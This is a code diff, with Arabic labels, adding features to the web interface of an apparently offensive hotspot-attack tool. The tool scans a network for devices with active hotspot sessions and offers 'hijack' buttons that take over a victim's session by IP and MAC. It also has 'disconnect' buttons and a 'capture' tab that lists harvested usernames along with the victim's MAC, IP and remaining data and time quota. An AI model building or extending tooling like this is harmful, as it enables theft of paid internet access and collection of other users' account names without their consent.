@@ -227,6 +227,7 @@
   <div class="tab" data-tab="log">📜 السجل</div>
   <div class="tab" data-tab="test">🧪 اختبار</div>
   <div class="tab" data-tab="macdevices">📡 MAC Devices</div>
+  <div class="tab" data-tab="capture">👤 مستحوذ</div>
   <div class="tab" data-tab="settings">⚙️ الإعدادات</div>
 </div>
 
@@ -239,6 +240,7 @@
         <button class="btn btn-d btn-sm" id="btnScanArp">📡 ARP فقط</button>
         <button class="btn btn-p btn-sm" id="btnScan">🔍 فحص عميق</button>
         <button class="btn btn-danger btn-sm" id="btnProbe" style="background:linear-gradient(135deg,#dc2626,#b91c1c);border:none;color:#fff;padding:4px 10px;border-radius:8px;cursor:pointer;font-size:.78rem">🎯 مسح يقيني</button>
+        <button class="btn btn-p btn-sm" id="btnSessionDetect" style="background:linear-gradient(135deg,#6366f1,#4f46e5);border:none;color:#fff;padding:4px 10px;border-radius:8px;cursor:pointer;font-size:.78rem">📡 كشف الجلسات</button>
       </div>
     </div>
     <div style="display:flex;gap:14px;flex-wrap:wrap;margin-bottom:10px;font-size:.78rem;color:rgba(255,255,255,0.45)">
@@ -248,12 +250,13 @@
       <span>الأجهزة: <b id="sCount" style="color:#22c55e">0</b></span>
       <span>المصدر: <b id="sSource" style="color:#818cf8">-</b></span>
       <span id="sProxyInfo" style="color:rgba(255,255,255,0.3);font-size:.7rem;display:none">-</span>
+      <span id="sNetworkInfo" style="color:rgba(255,255,255,0.4);font-size:.7rem;display:none">-</span>
     </div>
     <div class="steps" id="scanSteps" style="display:none"></div>
     <div class="tw">
       <table>
-        <thead><tr><th>#</th><th>IP</th><th>MAC</th><th>SSID</th><th>النوع</th><th>المصدر</th><th></th><th>الإجراءات</th></tr></thead>
-        <tbody id="scanTBody"><tr><td colspan="8" style="text-align:center;color:rgba(255,255,255,0.3);font-size:.8rem">اضغط فحص لاكتشاف الأجهزة</td></tr></tbody>
+        <thead><tr><th>#</th><th>IP</th><th>MAC</th><th>SSID</th><th>الشبكة</th><th>النوع</th><th>المصدر</th><th></th><th>الإجراءات</th></tr></thead>
+        <tbody id="scanTBody"><tr><td colspan="9" style="text-align:center;color:rgba(255,255,255,0.3);font-size:.8rem">اضغط فحص لاكتشاف الأجهزة</td></tr></tbody>
       </table>
     </div>
   </div>
@@ -498,6 +501,35 @@
   </div>
 </div>
 
+<div class="panel" id="panel-capture">
+  <div class="card">
+    <div class="ct" style="display:flex;justify-content:space-between;align-items:center">
+      <span>👤 الأسماء المخترقة (lastuser)</span>
+      <div style="display:flex;gap:6px">
+        <button class="btn btn-p btn-sm" id="btnCaptureCheck">🔍 فحص lastuser</button>
+        <button class="btn btn-d btn-sm" id="btnCaptureClear">🗑 مسح</button>
+        <button class="btn btn-s btn-sm" id="btnCaptureRefresh">🔄 تحديث</button>
+      </div>
+    </div>
+    <div id="captureStats" style="display:flex;gap:14px;flex-wrap:wrap;margin-bottom:10px;font-size:.74rem;color:rgba(255,255,255,0.4)">
+      <span>الإجمالي: <b id="capTotal" style="color:#818cf8">0</b></span>
+      <span>فريد: <b id="capUnique" style="color:#22c55e">0</b></span>
+      <span>آخر ساعة: <b id="capRecent" style="color:#a78bfa">0</b></span>
+    </div>
+    <div id="capLastuserDisplay" style="display:none;margin-bottom:12px;padding:12px 16px;background:rgba(34,197,94,0.1);border:1px solid rgba(34,197,94,0.2);border-radius:12px;text-align:center">
+      <div style="font-size:.7rem;color:rgba(255,255,255,0.4)">آخر lastuser مكتشف</div>
+      <div id="capLastuserValue" style="font-size:1.5rem;font-weight:700;color:#4ade80;font-family:monospace;direction:ltr;margin-top:4px">-</div>
+      <div id="capLastuserExtras" style="font-size:.7rem;color:rgba(255,255,255,0.3)"></div>
+    </div>
+    <div style="overflow-x:auto">
+      <table style="width:100%;border-collapse:collapse;font-size:.72rem">
+        <thead><tr style="color:rgba(255,255,255,0.4)"><th>#</th><th>lastuser</th><th>المصدر</th><th>MAC</th><th>IP</th><th>البايت</th><th>الوقت</th><th>التاريخ</th></tr></thead>
+        <tbody id="capTBody"><tr><td colspan="8" style="text-align:center;color:rgba(255,255,255,0.3)">لا توجد بيانات</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
 </div>
 
 <div class="modal-o" id="cardModal">
@@ -605,6 +637,38 @@
     </div>
     <div class="hpm-footer">
       <button class="btn btn-s btn-sm" id="hpmCloseBtn" style="display:none">✅ تم</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-o" id="sessionDetectModal">
+  <div class="hijack-progress-modal" style="max-width:600px">
+    <div class="hpm-header">
+      <div class="hpm-title-container">
+        <div class="hpm-icon" id="sdmIcon">📡</div>
+        <div>
+          <div class="hpm-title" id="sdmTitle">كشف الجلسات النشطة</div>
+          <div class="hpm-subtitle" id="sdmSubtitle">تحضير...</div>
+        </div>
+      </div>
+      <div class="hpm-timer" id="sdmTimer">⏱ 0s</div>
+    </div>
+    <div class="hpm-progress-bar-container">
+      <div class="hpm-progress-bar" id="sdmProgressBar">
+        <div class="hpm-progress-fill" id="sdmProgressFill" style="background:linear-gradient(90deg,#6366f1,#06b6d4)"></div>
+      </div>
+      <div class="hpm-progress-text" id="sdmProgressText">0%</div>
+    </div>
+    <div style="padding:8px 16px;font-size:.75rem;color:rgba(255,255,255,0.6)" id="sdmCurrentDevice">بانتظار البدء...</div>
+    <div class="hpm-steps" id="sdmSteps" style="max-height:200px;overflow-y:auto;padding:8px 16px">
+      <div style="text-align:center;color:rgba(255,255,255,0.3);font-size:.7rem" id="sdmResultsPlaceholder">🔍 سيتم عرض النتائج هنا...</div>
+    </div>
+    <div class="hpm-logs" id="sdmLogs" style="max-height:180px">
+      <div class="hpm-log-empty">⏳ انتظار بدء الفحص...</div>
+    </div>
+    <div class="hpm-footer">
+      <button class="btn btn-w btn-sm" id="sdmCancelBtn" style="display:none">⏹ إلغاء</button>
+      <button class="btn btn-s btn-sm" id="sdmCloseBtn" style="display:none">✅ تم</button>
     </div>
   </div>
 </div>
@@ -731,12 +795,27 @@ async function scanNetwork(mode){
     const potentialCount=d.potentialUserCount||0;
     const sCountEl=document.getElementById('sCount');
     if(potentialCount>0){sCountEl.textContent=d.totalFound+' 🔥'+potentialCount}else{sCountEl.textContent=d.totalFound||0}
-    if(d.source==='real-probe'&&d.confirmedCount!==undefined){document.getElementById('sSource').textContent='🎯 مسح يقيني ('+d.confirmedCount+' مؤكد)'}else{document.getElementById('sSource').textContent=d.source||'-'}
+    if(d._ouiStats){document.getElementById('sSource').textContent=(d.source||'-')+' | 🔁 '+d._ouiStats.hostsWithDupOui+' مشبوه'}else{if(d.source==='real-probe'&&d.confirmedCount!==undefined){document.getElementById('sSource').textContent='🎯 مسح يقيني ('+d.confirmedCount+' مؤكد)'}else{document.getElementById('sSource').textContent=d.source||'-'}}
     const proxyInfo=document.getElementById('sProxyInfo');
     if(proxyInfo){
       const totalProxy=d.totalProxyIps||0;
       proxyInfo.textContent=totalProxy>0?`${d.totalArp||0} IP في ARP | ${totalProxy} behind proxy-ARP`:'';
       proxyInfo.style.display=totalProxy>0?'block':'none';
+    }
+    const netInfo=document.getElementById('sNetworkInfo');
+    if(netInfo){
+      const hotspotNet=d.hotspotSubnet||(d.gateway?d.gateway.split('.').slice(0,3).join('.')+'.x':null);
+      if(d.networkStats){
+        const parts=Object.entries(d.networkStats).map(([net,cnt])=>{
+          const isHotspot=hotspotNet&&net===hotspotNet;
+          return `${isHotspot?'🔥':''}${net}: ${cnt}${isHotspot?' <span style="color:#22c55e">( hotspot )</span>':''}`;
+        });
+        netInfo.innerHTML='🌐 الشبكات: '+parts.join(' | ');
+        netInfo.style.display='inline';
+      }else if(hotspotNet){
+        netInfo.textContent='🌐 شبكة الهوتسبوت: '+hotspotNet;
+        netInfo.style.display='inline';
+      }
     }
     const hosts=d.hosts||[];const tb=document.getElementById('scanTBody');
 
@@ -744,7 +823,7 @@ async function scanNetwork(mode){
     st.textContent='المصدر: '+(typeLabels[d.source]||d.source)+(d.apiAvailable?' (API الراوتر متصل)':'')+(d.apiError?' (API الراوتر: '+d.apiError+')':'');
 
     const scanSsid=d.ssid||'-';
-    if(!hosts.length){tb.innerHTML='<tr><td colspan="8" style="text-align:center;color:rgba(255,255,255,0.3)">لا توجد أجهزة</td></tr>'}
+    if(!hosts.length){tb.innerHTML='<tr><td colspan="9" style="text-align:center;color:rgba(255,255,255,0.3)">لا توجد أجهزة</td></tr>'}
     else{
       tb.innerHTML=hosts.map((h,i)=>{
         const devColors={'MikroTik':'#f59e0b','Windows Device':'#3b82f6','Linux/Mac Device':'#22c55e','Web Server':'#a78bfa','Client Device':'rgba(255,255,255,0.5)','Unknown':'rgba(255,255,255,0.35)','Named Device':'#a78bfa'};
@@ -757,14 +836,21 @@ async function scanNetwork(mode){
         const hotspotBadge=h.isPotentialHotspotUser?'<span style="background:rgba(34,197,94,0.2);color:#22c55e;font-size:.6rem;padding:1px 6px;border-radius:4px;border:1px solid rgba(34,197,94,0.3)">🔥 جلسة محتملة</span>':'';
         const sortKey=h.isPotentialHotspotUser?'0'+i:i;
         const portsInfo=h.portCount>0?`<span style="color:#22c55e;font-size:.6rem;display:block">منافذ مفتوحة: ${h.openPorts||''}</span>`:'';
-        return `<tr${h.isPotentialHotspotUser?' style="background:rgba(34,197,94,0.05)"':''} data-ispot="${h.isPotentialHotspotUser?'1':'0'}"><td>${i+1}</td><td dir="ltr">${h.ip}${hostnameDisplay}${portsInfo}</td>
+        const netTag=h.networkTag||'-';
+        const isSameNet=h.isSameSubnetAsGateway;
+        const netBadge=isSameNet
+          ?`<span style="background:rgba(99,102,241,0.2);color:#818cf8;font-size:.6rem;padding:1px 5px;border-radius:4px;border:1px solid rgba(99,102,241,0.3)">🔥 ${netTag}</span>`
+          :`<span style="color:rgba(255,255,255,0.25);font-size:.6rem">${netTag}</span>`;
+        const netBg=isSameNet?'rgba(99,102,241,0.03)':'transparent';
+        return `<tr${h.isPotentialHotspotUser?' style="background:rgba(34,197,94,0.05)"':''} data-ispot="${h.isPotentialHotspotUser?'1':'0'}" style="${h.isPotentialHotspotUser?'':'background:'+netBg}"><td>${i+1}</td><td dir="ltr">${h.ip}${hostnameDisplay}${portsInfo}</td>
         <td dir="ltr" style="font-family:'Courier New',monospace;font-size:.7rem">${macDisplay}</td>
         <td style="font-size:.65rem;color:rgba(255,255,255,0.4);max-width:120px;overflow:hidden;text-overflow:ellipsis">${ssidDisplay}</td>
+        <td style="font-size:.6rem;text-align:center">${netBadge}</td>
         <td><span style="color:${vc};font-size:.75rem">${h.deviceType||h.vendor||'Unknown'}</span> ${hotspotBadge}${h.isConfirmed?'<span style="background:rgba(34,197,94,0.2);color:#22c55e;font-size:.6rem;padding:1px 5px;border-radius:4px;margin-right:3px">✔ مؤكد</span>':''}</td>
         <td style="font-size:.65rem;color:rgba(255,255,255,0.4)">${h.source||'-'}</td>
         <td>${typeIcon}</td>
         <td style="display:flex;gap:3px;flex-wrap:wrap">
-          ${h.isGateway?'<span style="color:rgba(255,255,255,0.3);font-size:.7rem;padding:4px 8px">🚪 البوابة</span>':(h.hasUniqueMac||h.isConfirmed)&&h.mac&&h.mac!=='N/A'?`<button class="btn btn-s btn-sm" onclick='hijackTarget(${JSON.stringify({ip:h.ip,mac:h.mac,vendor:h.deviceType||h.vendor}).replace(/'/g,"\\'")})'>🎯 اختراق</button>`:'<span style="color:rgba(255,255,255,0.15);font-size:.65rem">⚙️ proxy</span>'}
+          ${h.isGateway?'<span style="color:rgba(255,255,255,0.3);font-size:.7rem;padding:4px 8px">🚪 البوابة</span>':(h.hasUniqueMac||h.isConfirmed)&&h.mac&&h.mac!=='N/A'&&!h.duplicateOui?`<button class="btn btn-s btn-sm" onclick='hijackTarget(${JSON.stringify({ip:h.ip,mac:h.mac,vendor:h.deviceType||h.vendor}).replace(/'/g,"\\'")})'>🎯 اختراق</button>`:h.duplicateOui?'<span style="color:rgba(255,255,255,0.15);font-size:.65rem">🔁 OUI مشترك</span>':'<span style="color:rgba(255,255,255,0.15);font-size:.65rem">⚙️ proxy</span>'}
           ${h.isGateway?'':`<button class="btn btn-d btn-sm" onclick='disconnectTarget(${JSON.stringify({ip:h.ip,mac:h.mac}).replace(/'/g,"\\'")})'>🔌 فصل</button>`}
         </td></tr>`
       }).join('')
@@ -1165,6 +1251,184 @@ async function loadHijackState(){
   }catch(e){}
 }
 
+let sessionSse = null;
+
+async function startSessionDetection() {
+  if (!scanData || !scanData.hosts || !scanData.hosts.length) {
+    toast('❌ لا توجد بيانات مسح — قم بالمسح أولاً', 'e');
+    return;
+  }
+
+  const hosts = scanData.hosts.filter(h => h.mac && h.mac !== 'N/A' && !h.duplicateOui && !h.isGateway);
+  if (hosts.length === 0) {
+    toast('❌ لا توجد أجهزة مناسبة للفحص (جميعها ذات OUI مكرر أو البوابة)', 'e');
+    return;
+  }
+
+  const modal = document.getElementById('sessionDetectModal');
+  document.getElementById('sdmSubtitle').textContent = `فحص ${hosts.length} جهاز...`;
+  document.getElementById('sdmProgressFill').style.width = '0%';
+  document.getElementById('sdmProgressText').textContent = '0%';
+  document.getElementById('sdmTimer').textContent = '⏱ 0s';
+  document.getElementById('sdmCurrentDevice').textContent = '🔄 بدء الفحص...';
+  document.getElementById('sdmCloseBtn').style.display = 'none';
+  document.getElementById('sdmCancelBtn').style.display = 'inline-block';
+  document.getElementById('sdmResultsPlaceholder').innerHTML = '🔍 جاري فحص الأجهزة...';
+  document.getElementById('sdmLogs').innerHTML = '<div class="hpm-log-empty">⏳ انتظار بدء الفحص...</div>';
+  document.getElementById('sdmIcon').style.animation = 'hpmPulse 2s infinite';
+  modal.classList.add('on');
+
+  let startTime = Date.now();
+  const timerInt = setInterval(() => {
+    if (!modal.classList.contains('on')) { clearInterval(timerInt); return; }
+    const elapsed = Math.floor((Date.now() - startTime) / 1000);
+    document.getElementById('sdmTimer').textContent = '⏱ ' + elapsed + 's';
+  }, 500);
+
+  const devices = hosts.map(h => ({ ip: h.ip, mac: h.mac, vendor: h.vendor || h.deviceType || '', type: h.deviceType || '' }));
+
+  if (sessionSse) sessionSse.close();
+  sessionSse = new EventSource('/api/session/detect/progress');
+  sessionSse.onmessage = (e) => {
+    try {
+      const evt = JSON.parse(e.data);
+      if (evt.type === 'event') {
+        const d = evt.data;
+        if (d.step === 'start') {
+          addSessionLog(`🔍 بدء فحص ${d.data.total} جهاز`, 'info');
+          document.getElementById('sdmSubtitle').textContent = `فحص ${d.data.total} جهاز`;
+        } else if (d.step === 'probing') {
+          const p = d.data;
+          const pct = Math.round((p.index / p.total) * 100);
+          document.getElementById('sdmProgressFill').style.width = pct + '%';
+          document.getElementById('sdmProgressText').textContent = pct + '%';
+          document.getElementById('sdmCurrentDevice').innerHTML = `📡 (${p.index}/${p.total}) <b dir="ltr">${p.device.ip}</b> <span style="font-family:monospace;font-size:.65rem">${p.device.mac}</span>`;
+          addSessionLog(`🔍 (${p.index}/${p.total}) فحص ${p.device.ip} ${p.device.mac}`, 'info');
+        } else if (d.step === 'result') {
+          const r = d.data.device;
+          if (r.hasActiveSession) {
+            addSessionLog(`✅ ${r.ip} <span style="color:#22c55e">جلسة نشطة</span> ${r.lastuser ? '👤 ' + r.lastuser : ''}`, 'success');
+            addDeviceResult(r);
+          } else if (r.error) {
+            addSessionLog(`⚠️ ${r.ip}: ${r.error}`, 'warn');
+          } else {
+            addSessionLog(`❌ ${r.ip}: لا توجد جلسة`, 'info');
+          }
+        } else if (d.step === 'complete') {
+          const r = d.data;
+          const elapsedSec = (r.elapsed / 1000).toFixed(1);
+          document.getElementById('sdmProgressFill').style.width = '100%';
+          document.getElementById('sdmProgressText').textContent = '100%';
+          document.getElementById('sdmCurrentDevice').innerHTML = `✅ اكتمل — فحص ${r.total} جهاز، ${r.activeSessions} جلسة نشطة (${elapsedSec}ث)`;
+
+          if (r.activeSessions > 0) {
+            document.getElementById('sdmIcon').textContent = '🎉';
+            addSessionLog(`🎉 تم العثور على ${r.activeSessions} جلسة نشطة!`, 'success');
+          } else {
+            document.getElementById('sdmIcon').textContent = '💔';
+            addSessionLog(`💔 لم يتم العثور على جلسات نشطة`, 'warn');
+          }
+          completeSessionDetect(true, r);
+        } else if (d.step === 'cancelled') {
+          addSessionLog(`⏹ تم إلغاء الفحص بعد ${d.data.scanned} من ${d.data.total} جهاز`, 'warn');
+          completeSessionDetect(false, { cancelled: true, scanned: d.data.scanned, total: d.data.total });
+        } else if (d.step === 'error') {
+          addSessionLog(`❌ خطأ: ${d.data.error}`, 'error');
+          completeSessionDetect(false, d.data);
+        }
+      } else if (evt.type === 'result' && evt.data) {
+        const r = evt.data;
+        if (r.activeSessions > 0) {
+          document.getElementById('sdmIcon').textContent = '🎉';
+        }
+      }
+    } catch (err) {}
+  };
+  sessionSse.onerror = () => {};
+
+  try {
+    const r = await API.post('/api/session/detect', { devices });
+    if (!r.isSuccess) {
+      addSessionLog('❌ فشل بدء الفحص: ' + (r.error || ''), 'error');
+      completeSessionDetect(false, r);
+      clearInterval(timerInt);
+    }
+  } catch (e) {
+    addSessionLog('❌ خطأ: ' + e.message, 'error');
+    completeSessionDetect(false, { error: e.message });
+    clearInterval(timerInt);
+  }
+}
+
+function addDeviceResult(device) {
+  const container = document.getElementById('sdmSteps');
+  const placeholder = document.getElementById('sdmResultsPlaceholder');
+  if (placeholder) placeholder.remove();
+
+  const div = document.createElement('div');
+  div.style.cssText = 'display:flex;align-items:center;gap:8px;padding:6px 8px;margin-bottom:4px;background:rgba(34,197,94,0.08);border-radius:8px;border:1px solid rgba(34,197,94,0.2);font-size:.72rem';
+
+  const hijackBtn = device.hasActiveSession
+    ? `<button class="btn btn-s btn-sm" style="font-size:.65rem;padding:2px 8px" onclick="quickHijackFromDetect('${device.ip}','${device.mac}')">🎯 اختراق</button>`
+    : '';
+
+  div.innerHTML = `
+    <span style="font-family:monospace;font-size:.7rem;color:#818cf8" dir="ltr">${device.ip}</span>
+    <span style="font-family:monospace;font-size:.65rem;color:rgba(255,255,255,0.4)" dir="ltr">${device.mac}</span>
+    <span style="flex:1;text-align:right">${device.hasActiveSession ? '✅ <span style="color:#22c55e">جلسة نشطة</span>' : '❌'}</span>
+    ${device.lastuser ? '<span style="font-size:.65rem;color:#fbbf24">👤 '+device.lastuser+'</span>' : ''}
+    ${hijackBtn}
+  `;
+  container.appendChild(div);
+}
+
+function quickHijackFromDetect(ip, mac) {
+  document.getElementById('sessionDetectModal').classList.remove('on');
+  if (sessionSse) { sessionSse.close(); sessionSse = null; }
+  hijackTarget({ ip, mac, vendor: '' });
+}
+
+function addSessionLog(msg, type) {
+  const logs = document.getElementById('sdmLogs');
+  const empty = logs.querySelector('.hpm-log-empty');
+  if (empty) empty.remove();
+
+  const el = document.createElement('div');
+  el.className = 'hpm-log' + (type === 'error' ? ' error' : type === 'warn' ? ' warn' : type === 'success' ? ' success' : '');
+  const time = new Date().toLocaleTimeString('en-US', { hour12: false });
+  el.innerHTML = '[' + time + '] ' + msg;
+  logs.appendChild(el);
+  logs.scrollTop = logs.scrollHeight;
+}
+
+function completeSessionDetect(success, result) {
+  document.getElementById('sdmIcon').style.animation = 'none';
+  document.getElementById('sdmCancelBtn').style.display = 'none';
+  document.getElementById('sdmCloseBtn').style.display = 'inline-block';
+
+  if (sessionSse) { sessionSse.close(); sessionSse = null; }
+}
+
+document.getElementById('sdmCloseBtn').addEventListener('click', () => {
+  document.getElementById('sessionDetectModal').classList.remove('on');
+});
+document.getElementById('sdmCancelBtn').addEventListener('click', async () => {
+  await API.post('/api/session/detect/cancel', {});
+  addSessionLog('⏹ جاري إلغاء الفحص...', 'warn');
+  document.getElementById('sdmCancelBtn').style.display = 'none';
+});
+document.getElementById('sessionDetectModal').addEventListener('click', function(e) {
+  if (e.target === this) {
+    const closeBtn = document.getElementById('sdmCloseBtn');
+    if (closeBtn.style.display === 'block') {
+      this.classList.remove('on');
+      if (sessionSse) { sessionSse.close(); sessionSse = null; }
+    }
+  }
+});
+
+document.getElementById('btnSessionDetect').addEventListener('click', startSessionDetection);
+
 document.getElementById('btnRotStart').addEventListener('click',async()=>{
   const r=await API.get('/api/rotation/start');
   r.isSuccess?toast('بدء التناوب','s'):toast(r.error||'فشل','e');loadStatus()
@@ -1360,6 +1624,78 @@ async function testLogin(){
   }catch(e){toast(e.message,'e')}
   btn.disabled=false;loading.style.display='none'
 }
+
+async function loadCapturedCredentials() {
+  try {
+    const r = await API.get('/api/capture/credentials');
+    if (!r.isSuccess) return;
+    const d = r.value || {};
+    const creds = d.credentials || [];
+    const stats = d.stats || {};
+    document.getElementById('capTotal').textContent = stats.total || 0;
+    document.getElementById('capUnique').textContent = stats.uniqueUsers || 0;
+    document.getElementById('capRecent').textContent = stats.recentCount || 0;
+    const tb = document.getElementById('capTBody');
+    if (!creds.length) { tb.innerHTML = '<tr><td colspan="5" style="text-align:center;color:rgba(255,255,255,0.3)">لا توجد بيانات</td></tr>'; return; }
+    function fmtSec(s) { if (s == null) return '-'; const h = Math.floor(s / 3600); const m = Math.floor((s % 3600) / 60); return h > 0 ? h + 'h ' + m + 'm' : m + 'm'; }
+    function fmtBytes(b) { if (b == null) return '-'; if (b > 1073741824) return (b / 1073741824).toFixed(1) + ' GB'; if (b > 1048576) return (b / 1048576).toFixed(1) + ' MB'; if (b > 1024) return (b / 1024).toFixed(1) + ' KB'; return b + ' B'; }
+    tb.innerHTML = creds.map((c, i) => {
+      const t = new Date(c.capturedAt).toLocaleString('ar-SA');
+      const mac = c.victimMac || '-';
+      const ip = c.victimIp || c.ipAddress || '-';
+      const remBytes = fmtBytes(c.remainingBytes);
+      const remTime = fmtSec(c.remainingTime);
+      return '<tr><td>' + (i + 1) + '</td><td dir="ltr" style="font-family:monospace;color:#4ade80;font-weight:600">' + c.username + '</td><td>' + (c.source || '-') + '</td><td dir="ltr" style="font-family:monospace;font-size:.65rem;color:#818cf8">' + mac + '</td><td dir="ltr" style="font-family:monospace;font-size:.65rem">' + ip + '</td><td style="color:#a78bfa">' + remBytes + '</td><td style="color:#fbbf24">' + remTime + '</td><td style="font-size:.6rem;color:rgba(255,255,255,0.35)">' + t + '</td></tr>';
+    }).join('');
+  } catch (e) { console.error('capture load error', e); }
+}
+
+async function checkLastuser() {
+  const btn = document.getElementById('btnCaptureCheck');
+  const display = document.getElementById('capLastuserDisplay');
+  btn.disabled = true;
+  btn.textContent = '⏳ جاري الفحص...';
+  try {
+    const r = await API.get('/api/capture/check?url=http://m.net');
+    const v = r.value || {};
+    display.style.display = 'block';
+    if (v.lastuser) {
+      document.getElementById('capLastuserValue').textContent = v.lastuser;
+      document.getElementById('capLastuserValue').style.color = '#4ade80';
+      document.getElementById('capLastuserExtras').textContent = 'البايت: ' + (v.bytes || '?') + ' | الوقت: ' + (v.time || '?') + 's | الحالة: HTTP ' + v.httpStatus;
+      toast('✅ تم اكتشاف lastuser: ' + v.lastuser, 's');
+      loadCapturedCredentials();
+    } else if (v.sessionActive) {
+      document.getElementById('capLastuserValue').textContent = 'جلسة نشطة (لا يوجد lastuser)';
+      document.getElementById('capLastuserValue').style.color = '#eab308';
+      document.getElementById('capLastuserExtras').textContent = 'حجم الصفحة: ' + (v.htmlLength || '?') + 'b | HTTP ' + v.httpStatus;
+    } else {
+      document.getElementById('capLastuserValue').textContent = 'لا توجد جلسة نشطة';
+      document.getElementById('capLastuserValue').style.color = '#ef4444';
+      document.getElementById('capLastuserExtras').textContent = 'حجم الصفحة: ' + (v.htmlLength || '?') + 'b | HTTP ' + v.httpStatus;
+      toast('⚠️ لا توجد جلسة نشطة', 'w');
+    }
+  } catch (e) {
+    toast('❌ خطأ في الفحص: ' + e.message, 'e');
+  }
+  btn.disabled = false;
+  btn.textContent = '🔍 فحص lastuser';
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  setTimeout(function() {
+    if (document.getElementById('btnCaptureCheck')) {
+      document.getElementById('btnCaptureCheck').onclick = checkLastuser;
+      document.getElementById('btnCaptureRefresh').onclick = loadCapturedCredentials;
+      document.getElementById('btnCaptureClear').onclick = async function() {
+        if (!confirm('هل أنت متأكد من مسح جميع الأسماء المخترقة؟')) return;
+        await API.del('/api/capture/credentials');
+        toast('✅ تم المسح', 's');
+        loadCapturedCredentials();
+      };
+    }
+  }, 100);
+});
 
 function formatBytes(b){
   if(!b)return'0 B';
